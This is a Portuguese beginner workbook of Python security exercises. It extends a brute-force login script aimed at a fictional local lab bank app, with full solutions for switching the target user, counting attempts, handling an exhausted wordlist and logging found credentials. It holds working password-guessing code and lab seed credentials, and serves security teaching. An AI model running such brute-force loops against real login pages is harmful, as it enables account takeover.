# Caderno de Exercícios Práticos: Nível 01 (Iniciante)

**Material de Referência:** `01_GUIA_PRATICO_INICIANTE.md`  
**Script Base:** `bruteforce_simples.py`  
**Alvo:** NexusBank Corporate (`/login`)  

---

## 🎯 Objetivo Desta Lista

Praticar e fixar os conceitos fundamentais de Python aplicados à segurança:
* Manipulação de variáveis e alteração de parâmetros.
* Contadores de tentativas em laços `for`.
* Interpretação e tratamento de códigos de resposta HTTP.
* Gravação de relatórios simples em arquivo de texto.

---

## Exercício 1.1 — Alterando o Alvo para o Usuário Bruno

### Enunciado
O script original foi configurado para testar a usuária `"ana"`. No seed do banco de dados do laboratório, existe outro cliente registrado:
* **Usuário:** `bruno`
* **Senha cadastrada:** `senha123`

Modifique o script `bruteforce_simples.py` para testar as credenciais do usuário `bruno`.

### Tarefas
1. Altere o valor da variável `usuario` no início do código.
2. Certifique-se de que a senha `senha123` está presente no arquivo `senhas.txt`.
3. Execute o script e confirme se a senha foi identificada com status 200.

### Resolução Sugerida
```python
import requests

# Alteração da variável de usuário para bruno
url = "http://127.0.0.1:8002/login"
usuario = "bruno"
arquivo_senhas = "senhas.txt"

print(f"Iniciando o teste de autenticação para o usuário: {usuario}...")

with open(arquivo_senhas, "r") as arquivo:
    for linha in arquivo:
        senha = linha.strip()
        dados = {"usuario": usuario, "senha": senha}
        resposta = requests.post(url, json=dados)

        print(f"Testando senha: {senha} -> Status: {resposta.status_code}")

        if resposta.status_code == 200:
            print("\n>>> AUTENTICAÇÃO REALIZADA COM SUCESSO! <<<")
            print(f"A senha do usuário '{usuario}' é: {senha}")
            break

print("Processo finalizado.")
```

---

## Exercício 1.2 — Contador de Tentativas Realizadas

### Enunciado
No script atual, não sabemos quantas senhas foram testadas até o acerto.  
Adicione uma variável contadora chamada `tentativas` que se inicia em zero e soma `+1` a cada repetição do laço.

### Tarefas
1. Crie a variável `tentativas = 0` antes do laço `with open`.
2. Dentro do `for`, incremente o contador: `tentativas += 1`.
3. Imprima o número da tentativa no terminal (ex.: `[Tentativa 1] Testando senha...`).
4. Ao final, caso encontre a senha, exiba o total de tentativas necessárias para localizar o acesso.

### Resolução Sugerida
```python
import requests

url = "http://127.0.0.1:8002/login"
usuario = "ana"
arquivo_senhas = "senhas.txt"

tentativas = 0

print(f"Iniciando testes para {usuario}...")

with open(arquivo_senhas, "r") as arquivo:
    for linha in arquivo:
        tentativas += 1
        senha = linha.strip()

        dados = {"usuario": usuario, "senha": senha}
        resposta = requests.post(url, json=dados)

        print(f"[Tentativa {tentativas}] Senha: '{senha}' -> Status: {resposta.status_code}")

        if resposta.status_code == 200:
            print(f"\n>>> SUCESSO na tentativa nº {tentativas}! A senha é: '{senha}' <<<")
            break

print("Fim dos testes.")
```

---

## Exercício 1.3 — Tratamento de Senha Não Encontrada

### Enunciado
Se nenhuma senha do arquivo `senhas.txt` for a correta, o script atual simplesmente termina sem dar um aviso claro ao usuário de que a busca falhou.  
Implemente uma **variável de controle (flag)** chamada `senha_encontrada` para emitir uma mensagem avisando que a wordlist se esgotou sem sucesso.

### Tarefas
1. Crie `senha_encontrada = False` antes do laço.
2. Quando `resposta.status_code == 200`, mude a variável para `True` antes de acionar o `break`.
3. Fora do laço `with open`, verifique com um `if not senha_encontrada:` e informe que nenhuma senha testada foi aceita pelo servidor.

### Resolução Sugerida
```python
import requests

url = "http://127.0.0.1:8002/login"
usuario = "ana"
arquivo_senhas = "senhas.txt"

senha_encontrada = False

with open(arquivo_senhas, "r") as arquivo:
    for linha in arquivo:
        senha = linha.strip()
        resposta = requests.post(url, json={"usuario": usuario, "senha": senha})

        if resposta.status_code == 200:
            print(f">>> SUCESSO! Senha localizada: {senha}")
            senha_encontrada = True
            break

# Verificação pós-laço
if not senha_encontrada:
    print(f"[-] A lista de senhas terminou e nenhuma credencial foi válida para '{usuario}'.")
```

---

## Exercício 1.4 — Gravando o Resultado em Arquivo de Log (`resultado.txt`)

### Enunciado
Em auditorias de sistemas, os resultados das tentativas devem ser armazenados em disco para gerar relatórios de vulnerabilidade.  
Modifique o script para que, assim que a senha correta for localizada, o resultado seja gravado em um arquivo chamado `resultado.txt`.

### Tarefas
1. Ao identificar o status 200, abra o arquivo `resultado.txt` em modo de escrita (`"w"`).
2. Escreva uma linha contendo o usuário e a senha localizada.

### Resolução Sugerida
```python
import requests

url = "http://127.0.0.1:8002/login"
usuario = "ana"
arquivo_senhas = "senhas.txt"

with open(arquivo_senhas, "r") as arquivo:
    for linha in arquivo:
        senha = linha.strip()
        resposta = requests.post(url, json={"usuario": usuario, "senha": senha})

        if resposta.status_code == 200:
            print(f">>> Sucesso! Senha: {senha}")

            # Gravação em arquivo
            with open("resultado.txt", "w", encoding="utf-8") as arq_resultado:
                arq_resultado.write(f"Usuário: {usuario}\nSenha localizada: {senha}\n")

            print("[+] Resultado gravado com sucesso no arquivo 'resultado.txt'.")
            break
```
